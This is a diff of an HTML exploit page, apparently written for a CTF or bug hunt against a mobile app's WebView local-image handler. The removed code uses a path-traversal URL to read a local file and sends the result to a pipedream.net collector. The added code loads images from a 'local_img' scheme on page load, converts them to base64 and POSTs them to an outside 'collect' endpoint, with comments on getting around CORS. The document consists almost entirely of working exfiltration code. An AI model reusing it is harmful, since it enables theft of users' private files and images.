@@ -1,16 +1,117 @@
-<h1 id="wjh">TEST</h1>
-<img id="img" src="" width="300"/><br>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Image Data Exfiltration</title>
+    <script>
+        // 目标网站的接收端点（需提前在blog.wjhwjhn.com准备好）
+        const TARGET_URL = "https://blog.wjhwjhn.com/collect";
+        
+        // 要加载的图片列表（假设你知道有哪些图片会被拦截）
+        const IMAGE_PATHS = [
+            "https://local_img/image1.png",
+            "https://local_img/image2.jpg",
+            // 添加更多图片路径...
+        ];
 
+        // 加载图片并提取数据
+        async function loadAndExfiltrateImages() {
+            for (const imgUrl of IMAGE_PATHS) {
+                try {
+                    console.log("Loading image:", imgUrl);
+                    
+                    // 方案1: 使用<img>标签 + Canvas 获取Base64
+                    await captureImageViaCanvas(imgUrl);
+                    
+                    // 方案2: 使用fetch() + Blob（需考虑跨域）
+                    // await captureImageViaFetch(imgUrl);
+                } catch (e) {
+                    console.error("Failed to process image:", imgUrl, e);
+                }
+            }
+        }
 
-<script>
-request_url = "https://evilsnssdk.com/53e9290f0d8d5b184b95cc97b0884a0a/1/175264841661378022/trap.html/..https://local_img/.//..https://local_img/.//..https://local_img/.//..https://local_img/.//..https://local_img/.//..https://local_img/.//..https://local_img/.//..https://local_img/.//sdcard/jsbridge_api_Finder.html/https://local_img/?need_common_params=1&append_common_params=1&_pia_=1&param_from=url'"
-var request = new XMLHttpRequest();
-request.open('GET', request_url);
-request.onload = function () {
-	var img = document.getElementById("img");
-    if (request.readyState === 4 && request.status === 200) {
-        img.setAttribute("src", "https://eo2bmxea4olrjro.m.pipedream.net?flag=" + request.responseText);
-	}
-};
-request.send(null);
-</script>
+        // 方法1: 通过<img>标签和Canvas获取Base64数据
+        function captureImageViaCanvas(url) {
+            return new Promise((resolve, reject) => {
+                const img = new Image();
+                img.crossOrigin = "Anonymous"; // 尝试绕过CORS（可能不适用）
+                
+                img.onload = () => {
+                    const canvas = document.createElement("canvas");
+                    canvas.width = img.width;
+                    canvas.height = img.height;
+                    
+                    const ctx = canvas.getContext("2d");
+                    ctx.drawImage(img, 0, 0);
+                    
+                    // 获取Base64数据
+                    const base64Data = canvas.toDataURL("image/png");
+                    console.log("Captured image data:", base64Data.substring(0, 50) + "...");
+                    
+                    // 发送到目标网站
+                    sendDataToTarget({
+                        type: "image",
+                        url: url,
+                        data: base64Data,
+                        timestamp: new Date().toISOString()
+                    });
+                    
+                    resolve();
+                };
+                
+                img.onerror = (e) => {
+                    console.error("Image load error:", e);
+                    reject(e);
+                };
+                
+                img.src = url + "?t=" + Date.now(); // 加时间戳避免缓存
+            });
+        }
+
+        // 方法2: 通过fetch()获取Blob数据（可能受CORS限制）
+        async function captureImageViaFetch(url) {
+            try {
+                const response = await fetch(url);
+                const blob = await response.blob();
+                
+                const reader = new FileReader();
+                reader.onload = () => {
+                    const base64Data = reader.result;
+                    sendDataToTarget({
+                        type: "image",
+                        url: url,
+                        data: base64Data,
+                        timestamp: new Date().toISOString()
+                    });
+                };
+                reader.readAsDataURL(blob);
+            } catch (e) {
+                console.error("Fetch error:", e);
+                throw e;
+            }
+        }
+
+        // 发送数据到目标网站
+        function sendDataToTarget(data) {
+            // 方法1: 使用fetch（可能受CORS限制）
+            fetch(TARGET_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data),
+                mode: "no-cors" // 尝试绕过CORS（但服务器仍需接受）
+            }).catch(e => console.error("Send error:", e));
+
+            // 方法2: 使用navigator.sendBeacon（更适合少量数据）
+            // const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
+            // navigator.sendBeacon(TARGET_URL, blob);
+        }
+
+        // 页面加载后开始执行
+        window.addEventListener("DOMContentLoaded", loadAndExfiltrateImages);
+    </script>
+</head>
+<body>
+    <h1>Image Data Transfer Page</h1>
+    <p>Check console for details. Data is being sent to target site.</p>
+</body>
+</html>
